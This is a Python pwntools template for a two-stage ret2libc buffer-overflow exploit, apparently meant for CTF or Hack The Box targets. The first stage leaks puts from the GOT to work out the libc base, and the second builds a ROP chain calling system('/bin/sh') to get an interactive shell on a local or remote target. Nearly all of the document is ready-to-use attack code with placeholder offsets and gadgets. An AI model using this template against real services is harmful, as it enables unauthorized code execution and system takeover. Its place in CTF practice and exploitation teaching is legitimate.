#!/usr/bin/env python3
"""
ret2libc Exploit Template (Two-Stage with Leak)
================================================
Classic ret2libc attack with libc leak.

Requirements:
- Buffer overflow vulnerability
- No PIE or PIE base known
- No stack canary or canary leaked
- NX enabled (can't execute shellcode)
- Partial RELRO (GOT readable)

Technique:
1. Leak libc address via puts/printf GOT
2. Calculate libc base
3. Return to system("/bin/sh")

Usage:
    python3 ret2libc.py          # Local
    python3 ret2libc.py GDB      # With GDB
    python3 ret2libc.py REMOTE   # Remote
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './binary'
OFFSET = 72              # TODO: Offset to return address

# Gadgets - Find with: ROPgadget --binary ./binary | grep "pop rdi"
POP_RDI = 0x401234       # TODO: pop rdi ; ret
RET = 0x401235           # TODO: ret (for stack alignment)

HOST = 'target.htb'
PORT = 1337

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf

# TODO: Set correct libc path after identification
# Use /pwn-libc to identify from leaked addresses
# libc = ELF('./libc.so.6')
libc = elf.libc  # Use default system libc for local testing

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, '''
            b main
            c
        ''')
    else:
        return process(BINARY)

def main():
    io = conn()

    # ==========================================================================
    # STAGE 1: LEAK LIBC ADDRESS
    # ==========================================================================
    log.info("Stage 1: Leaking libc address via puts...")

    # Leak puts@got using puts@plt
    # Chain: pop_rdi -> puts@got -> puts@plt -> main (for second input)
    payload1 = flat(
        b'A' * OFFSET,           # Padding
        POP_RDI,                 # Pop next value into RDI
        elf.got['puts'],         # Address of puts@got (contains libc puts addr)
        elf.plt['puts'],         # Call puts to print the address
        elf.symbols['main']      # Return to main for second payload
    )

    io.sendline(payload1)

    # Parse the leaked address
    # Adjust recvuntil based on binary output
    # io.recvuntil(b'some_prompt')
    io.recvline()  # Skip any output before leak

    leaked = io.recv(6)  # Receive 6 bytes (x86_64 address without null bytes)
    puts_libc = u64(leaked.ljust(8, b'\x00'))

    log.success(f"Leaked puts@libc: {hex(puts_libc)}")

    # Calculate libc base
    libc.address = puts_libc - libc.symbols['puts']
    log.success(f"libc base: {hex(libc.address)}")

    # Verify alignment (should be page-aligned)
    if libc.address & 0xfff != 0:
        log.warning("libc base not page-aligned! Check leak parsing.")

    # ==========================================================================
    # STAGE 2: GET SHELL
    # ==========================================================================
    log.info("Stage 2: Calling system('/bin/sh')...")

    # Find /bin/sh string in libc
    bin_sh = next(libc.search(b'/bin/sh'))
    system = libc.symbols['system']

    log.info(f"/bin/sh at: {hex(bin_sh)}")
    log.info(f"system at: {hex(system)}")

    # Chain: ret (alignment) -> pop_rdi -> /bin/sh -> system
    payload2 = flat(
        b'A' * OFFSET,
        RET,                     # Stack alignment for movaps
        POP_RDI,
        bin_sh,                  # Argument: "/bin/sh"
        system                   # Call system()
    )

    io.sendline(payload2)

    # ==========================================================================
    # GOT SHELL!
    # ==========================================================================
    log.success("Payload sent! Enjoy your shell :)")
    io.interactive()

if __name__ == '__main__':
    main()
